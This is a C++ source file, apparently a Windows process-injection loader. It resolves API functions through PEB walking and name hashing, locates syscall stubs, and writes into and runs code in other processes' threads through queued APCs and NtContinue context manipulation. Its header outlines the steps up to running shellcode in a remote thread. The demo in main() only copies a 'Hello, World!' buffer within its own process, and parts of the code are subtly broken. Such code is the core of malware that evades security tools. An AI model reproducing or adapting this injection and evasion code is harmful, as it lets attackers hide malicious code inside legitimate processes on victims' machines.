#include "header.h"

// process injection
//// 1. find process                                                    ////
//// 2. Open the target process                                         ////
//// 3. allocate memory on the remote process                           ////
//// 5. write the shellcode                                             ////
//// 6. Create suspended thread                                         ////
//// 7. queue the APC to execute the shellcode in the remote thread     ////

// compile time hash with constexpr
constexpr DWORD64 hashB(const char* chaine) {
    DWORD64 constante = 0xA28;
    int c = 0;

    while (c = *chaine++)
        constante = (constante << 5) + constante + c;

    return constante;
}

LPWSTR get_dll_name(PLDR_DATA_TABLE_ENTRY liste_flink) {

    PWCHAR ddl_name = liste_flink->FullDllName.Buffer;
    PWSTR dll = wcsrchr(ddl_name, '\\') + 1;
    return dll;
}

PVOID get_func(DWORD64 func_hashed) {

    // get the PEB
    PPEB ppeb = (PPEB)__readgsqword(0x60);

    // get the list which contains our loaded modules in the memory
    PLDR_DATA_TABLE_ENTRY liste_flink = (PLDR_DATA_TABLE_ENTRY)((PBYTE)ppeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // get the DLL name
    LPWSTR dll_name = get_dll_name(liste_flink);

    // base address of the DLL load in memory
    PDWORD base_addr = (PDWORD)liste_flink->DllBase;

    // Header DOS of the image of the DLL
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base_addr;
    PIMAGE_NT_HEADERS64 pe_header = (PIMAGE_NT_HEADERS64)((DWORD64)base_addr + dos_header->e_lfanew);

    // Adresse virtuelle du répertoire d'exportation
    ULONG offset_virtual_addresse = pe_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)((DWORD64)offset_virtual_addresse + (DWORD64)base_addr);

    PDWORD adr_name = (PDWORD)((DWORD64)export_directory->AddressOfNames + (DWORD64)base_addr);
    PDWORD adr_func = (PDWORD)((DWORD64)export_directory->AddressOfFunctions + (DWORD64)base_addr);
    PWORD adr_ordinal = (PWORD)((DWORD64)export_directory->AddressOfNameOrdinals + (DWORD64)base_addr);

    // run on our number of function
    for (DWORD i = 0; i < export_directory->NumberOfFunctions; i++) {

        //PCHAR name = (PCHAR)(DWORD64)(adr_name + i * 8);

        DWORD_PTR adr_name_ = (DWORD64)adr_name[i] + (DWORD64)base_addr;
        //printf("Get :: %s\n", (char*)adr_name_);

        // compare the hash calculated of our function and the hash of the function of the dll
        if (func_hashed == hashB((char*)adr_name_)) {
            // be could use the name
            return (PVOID)((DWORD64)base_addr + adr_func[adr_ordinal[i]]);
        }
    }
    return 0;
}


// get PID of a process by its name
DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (!_wcsicmp(processEntry.szExeFile, processName.c_str())) {
                CloseHandle(snapshot);
                return processEntry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return 0; // Not found
}

DWORD FindThreadId(DWORD pid) {
    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == pid) {
                CloseHandle(snapshot);
                return threadEntry.th32ThreadID;
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }

    CloseHandle(snapshot);
    return 0;
}

// from here https://github.com/0xkylm/shitty-loader/blob/main/Shitty-loader/Shitty-loader.cpp#L42
BYTE* FindSyscallAddr(DWORD64 hash) {

    PVOID func_my_NtOpenProcess = (PVOID)get_func(hash);
    syscallAddress_NtOpenProcess = (DWORD64)(PVOID)func_my_NtOpenProcess;


    BYTE* func_base = (BYTE*)(func_my_NtOpenProcess);
    BYTE* temp_base = 0x00;
    //0x0F + 0x05 = syscall
    // 0xc3 = ret
    while (*func_base != 0xc3) {
        temp_base = func_base;
        if (*temp_base == 0x0f) {
            temp_base++;
            if (*temp_base == 0x05) {
                temp_base++;
                if (*temp_base == 0xc3) {
                    temp_base = func_base;
                    break;
                }
            }
        }
        else {
            func_base++;
            temp_base = 0x00;
        }
    }
    return func_base;
}

DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE* pAddress, BYTE* pData, DWORD dwLength)
{
    HANDLE hThread = NULL;
    pNtQueueApcThread_t pNtQueueApcThread = (pNtQueueApcThread_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");
    if (!pNtQueueApcThread) return 1;

    pNtCreateThreadEx_t pNtCreateThreadEx = (pNtCreateThreadEx_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    if (!pNtCreateThreadEx) return 1;

    void* pRtlFillMemory = NULL;

    // find NtQueueApcThread function
    pRtlFillMemory = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlFillMemory");


    if (pNtCreateThreadEx(&hThread, NT_CREATE_THREAD_EX_ALL_ACCESS, NULL, hProcess, (LPVOID)ExitThread, (LPVOID)0, NT_CREATE_THREAD_EX_SUSPENDED, 0, 0, 0, NULL) != 0)


        // find RtlFillMemory function
        pRtlFillMemory = (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "RtlFillMemory");
    if (pRtlFillMemory == NULL)
    {
        return 1;
    }

    // create suspended thread (ExitThread)
    if (pNtCreateThreadEx(&hThread, NT_CREATE_THREAD_EX_ALL_ACCESS, NULL, hProcess, (LPVOID)ExitThread, (LPVOID)0, NT_CREATE_THREAD_EX_SUSPENDED, NULL, 0, 0, NULL) != 0)
    {
        return 1;
    }

    // write memory
    for (DWORD i = 0; i < dwLength; i++)
    {
        // schedule a call to RtlFillMemory to update the current byte
        if (pNtQueueApcThread(hThread, pRtlFillMemory, (void*)((BYTE*)pAddress + i), (void*)1, (void*)*(BYTE*)(pData + i)) != 0)
        {
            // error
            TerminateThread(hThread, 0);
            CloseHandle(hThread);
            return 1;
        }
    }

    // resume thread to execute queued APC calls
    ResumeThread(hThread);

    // wait for thread to exit
    WaitForSingleObject(hThread, INFINITE);

    // close thread handle
    CloseHandle(hThread);

    return 0;
}

BOOL WriteContext(HANDLE hProcess, PCONTEXT pContext, PBYTE pAddress) {
    WriteProcessMemoryAPC(hProcess, pAddress, (PBYTE)pContext, sizeof(CONTEXT));
    return TRUE;
}



template <typename T>
DWORD64 to_qword(T val) {
    if constexpr (std::is_pointer_v<T>)
        return reinterpret_cast<DWORD64>(val);
    else if constexpr (std::is_integral_v<T>)
        return static_cast<DWORD64>(val);
    else
        static_assert(std::is_pointer_v<T> || std::is_integral_v<T>, "Unsupported type");
}


template <typename... Args>
void callapc(HANDLE hProc, HANDLE hThread, PVOID func, Args... args) {

    std::vector<DWORD64> argArray = { to_qword(args)... };

    // create suspended thread / Ntcontinue / give it struct conetxt et exec sleep
    pNtContinue_t NtContinue = (pNtContinue_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), ("NtContinue"));
    pNtQueueApcThread_t NtQueueApcThread = (pNtQueueApcThread_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), ("NtQueueApcThread"));
    
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL | CONTEXT_ALL;
    GetThreadContext(hThread, &ctx);
    // if less than 3 args, call direct

    if (argArray.size() < 3) {
        NTSTATUS status = NtQueueApcThread(hThread, func, (PVOID)argArray[0], (PVOID)argArray[1], (PVOID)argArray[2]);
        printf("[+] bleubleute sans context\n");
        return;
	}

    if (argArray.size() > 0) ctx.Rcx = argArray[0];
    if (argArray.size() > 1) ctx.Rdx = argArray[1];
    if (argArray.size() > 2) ctx.R8 = argArray[2];
    if (argArray.size() > 3) ctx.R9 = argArray[3];

    ctx.Rip = (DWORD64)func;

    DWORD64 backup_rsp = ctx.Rsp;
    
    ctx.Rsp += sizeof(CONTEXT) * (count+1);

    //*((DWORD64*)ctx.Rsp) = (DWORD64)ExitThread;

	//WriteProcessMemoryAPC(hProc, (PBYTE)ctx.Rsp , (PBYTE)ExitThread, sizeof(DWORD64));
    WriteContext(hProc, &ctx, (PBYTE)(ctx.Rsp));

    NTSTATUS status = NtQueueApcThread(hThread, NtContinue, (PVOID)&ctx, (PVOID)true, NULL);
    printf("[+] bleubleute avec du context\n");
    count++;

}

int main() {
	char buf[] = "Hello, World!";
    char buf_[100] = {0};
    HANDLE hThread = CreateThread(NULL, sizeof(CONTEXT)*2, (LPTHREAD_START_ROUTINE)ExitThread, NULL, CREATE_SUSPENDED, NULL);

    callapc(GetCurrentProcess(), hThread, WriteProcessMemory, GetCurrentProcess(), buf, buf_, 0x32, NULL);

    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Thread resumed\n");
    printf("[*] Done\n");
    printf("[*] buf == %s\n",buf_);

    return 0;
}
